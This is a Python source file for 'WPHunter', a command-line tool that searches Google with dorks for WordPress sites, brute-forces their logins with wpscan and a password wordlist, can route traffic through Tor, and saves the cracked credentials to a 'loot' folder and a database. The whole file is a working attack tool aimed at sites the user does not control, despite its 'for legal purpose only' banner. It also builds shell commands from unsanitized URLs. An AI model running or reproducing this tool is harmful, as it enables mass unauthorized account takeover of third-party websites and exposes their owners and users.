# -*- coding: utf-8 -*-
# Author: calfcrusher@inventati.org

import os
import signal
import time
import subprocess
import json
import sqlite3

from googlesearch import search
from urllib.parse import urlparse
from pathlib import Path
from termcolor import colored
from subprocess import check_output
from prettytable import from_db_cursor
from prettytable import PrettyTable


def showdorks():
    """Show Wordpress google dorks available and returns choosen"""

    # Get all Wordpress sites general query
    dork1 = "\"index of\" inurl:wp-content/\""
    # Get all Wordpress sites using wp-shopping-cart plugin
    dork2 = "\"inurl:\"/wp-content/plugins/wp-shopping-cart/\""
    # Get all Wordpress HTTP older sites (exclude pdf files from results)
    dork3 = "inurl:wp-content/ inurl:http before:2016 -filetype.pdf"
    # Get all Wordpress sites another general query
    dork4 = "\"index of \":wp-content/ intitle:\"WordPress\""

    table = PrettyTable()

    table.field_names = ["NUM", "DORK", "INFO"]

    table.add_row([1, dork1, "Wordpress general query"])
    table.add_row([2, dork2, "Wordpress wp-shopping-cart plugin"])
    table.add_row([3, dork3, "Wordpress HTTP older sites"])
    table.add_row([4, dork4, "Wordpress another general query"])

    print()
    print(colored(table, 'magenta'))
    print()

    while True:
        response = input(colored(" Choose dork to run [1-4] ", 'yellow'))
        if not response.isnumeric():
            continue
        elif int(response) in range(1,5):
            if int(response) == 1:
                dork = dork1
            elif int(response) == 2:
                dork = dork2
            elif int(response) == 3:
                dork = dork3
            elif int(response) == 4:
                dork = dork4
            break
        else:
            continue

    return dork


def showcreds():
    """Load and show credentials from db"""

    conn = sqlite3.connect(dbfile)
    with conn:
        cur = conn.cursor()
        cur.execute('SELECT * FROM Credentials ORDER BY url')
        data = from_db_cursor(cur)

    print()
    print(colored(data, 'magenta'))
    print()

    cur.close()

    while True:
        response = input(colored(" Back to menu or exit [menu/exit] ", 'yellow'))
        if not response.isalpha():
            continue
        if response == 'menu' or response == 'exit':
            break

    if response == 'menu':
        # Back to menu
        os.system("clear")
        main()
    else:
        # Exit
        os.system("clear")
        exit(0)


def savecreds(pathfile, url):
    """Save possible credentials to db"""


    try:
        connection = sqlite3.connect(dbfile)
        cursor = connection.cursor()
        # Reading JSON from file - a nested dict -
        with open(pathfile) as json_file:
            obj_data = json.load(json_file)
            # If 'password_attack is found then we scanning was completed
            if 'password_attack' in obj_data:
                for username in obj_data['password_attack']:
                    # username var will be empty if no creds found so insert will not be triggered
                    if username:
                        print(colored(" * Pw3ned! " + url, 'magenta'))
                        # Write credentials to db
                        cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                        connection.commit()
                        credsfound = True
        cursor.close()
    except sqlite3.Error:
        print(colored(" * Error while connecting to database!", 'red'))


def wpscan(wpurl, wordlists, pathfile, usetor):
    """Run wpscan """

    if usetor:
        # Run wpscan with tor
        os.system("wpscan --request-timeout 500 --connect-timeout 120 -t 4 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
        savecreds(pathfile, wpurl)
    else:
        # Run wpscan without tor
        os.system("wpscan --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
        savecreds(pathfile, wpurl)


def googledork(dork, amount, wordlist, usetor):
    """Wordpress google dork"""

    print()
    print(colored(" * Retrieving Google results..", 'red'))
    print()

    requ = 0

    # Check if loot folder exist
    loot_path = str(os.getcwd() + "/loot/")
    if not os.path.exists(loot_path):
        os.makedirs(loot_path)

    for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
        parsed_uri = urlparse(result)
        wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
        # wordpress = "http://192.168.1.29/wordpress/"

        # Create filename
        filename = parsed_uri.netloc + ".json".strip('\n')
        pathfile = loot_path + filename

        if Path(pathfile).is_file():
            # File exist already so skip this host
            print(colored(" - Skipping " + wordpress + " (already scanned)", 'red'))
            time.sleep(0.1)
            requ += 1
            if requ >= int(amount):
                break
            time.sleep(0.1)
            continue

        print(colored(" + Scanning " + wordpress, 'red'))
        wpscan(wordpress, wordlist, pathfile, usetor)
        time.sleep(0.1)
        requ += 1
        if requ >= int(amount):
            break
        time.sleep(0.1)


def main():
    """Main function of tool"""

    print("""\033[91m 
 ░██╗░░░░░░░██╗██████╗░██╗░░██╗██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░
 ░██║░░██╗░░██║██╔══██╗██║░░██║██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗
 ░╚██╗████╗██╔╝██████╔╝███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝
 ░░████╔═████║░██╔═══╝░██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗
 ░░╚██╔╝░╚██╔╝░██║░░░░░██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║
 ░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
        
 WPHunter 1.0 (c)2021 by calfcrusher@inventati.org - for legal purpose only
    \x1b[0m""")

    global dbfile
    dbfile = "creds.db"
    global credsfound
    credsfound = False

    # Check if wpscan is installed
    rc = subprocess.call(['which', 'wpscan'], stdout=subprocess.PIPE)
    if rc:
        print()
        print(colored(' * ERROR - This tool requires wpscan to run ! (https://github.com/wpscanteam/wpscan)', 'red'))
        exit(0)

    print(colored(" -------------------", 'green'))
    print(colored(" 1. Search & Brute", 'green'))
    print(colored(" 2. Show Credentials", 'green'))
    print(colored(" 3. Exit", 'green'))
    print(colored(" -------------------", 'green'))
    print()

    while True:
        response = input(colored(" Enter your choice [1-3] ", 'yellow'))
        if not response.isnumeric():
            main()
            continue
        else:
            break

    if int(response) == 2:
        showcreds()
    elif int(response) == 3:
        os.system("clear")
        exit(0)
    elif int(response) != 1:
        main()

    dork = showdorks()

    while True:
        response = input(colored(" Enter number of results to retrieve: ", 'yellow'))
        if not response.isnumeric():
            print(colored(" * Please insert a number", 'red'))
            continue
        else:
            amount = response
            break
    while True:
        response = input(colored(" Type full path to password wordlist: ", 'yellow'))
        if not os.path.isfile(response):
            print(colored(" * Unable to access file !", 'red'))
            continue
        else:
            wordlist = response
            break

    usetor = False

    while True:
        response = input(colored(" Do you want use TOR? [yes/no] ", 'yellow'))
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break
    if response == 'yes':
        # Check if tor is installed
        rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if rc:
            # Asking for valid response
            while True:
                response = input(colored(" * Unable to find TOR! Run without it ? [yes/no]", 'yellow'))
                if not response.isalpha():
                    print(colored(" * Please type yes or no", 'red'))
                    continue
                if response == 'yes' or response == 'no':
                    break
            if response == 'yes':
                print(colored(" * Running scan with TOR disabled..", 'red'))
                usetor = False
            else:
                print(colored(" * Exiting..", 'yellow'))
                exit(0)
        else:
            # Start TOR
            print()
            print(colored(" * Starting tor network..", 'red'))
            os.system("tor --quiet &")
            time.sleep(5)
            usetor = True

    googledork(dork, amount, wordlist, usetor)

    if usetor:
        # Kill TOR
        print()
        print(colored(" * Killing TOR pid..", 'yellow'))
        os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)

    if credsfound:
        print(colored(" * Completed - Passwords FOUND!", 'magenta'))
    else:
        print(colored(" * Completed - Passwords Not Found", 'red'))
    exit(0)


if __name__ == '__main__':
    os.system("clear")
    main()
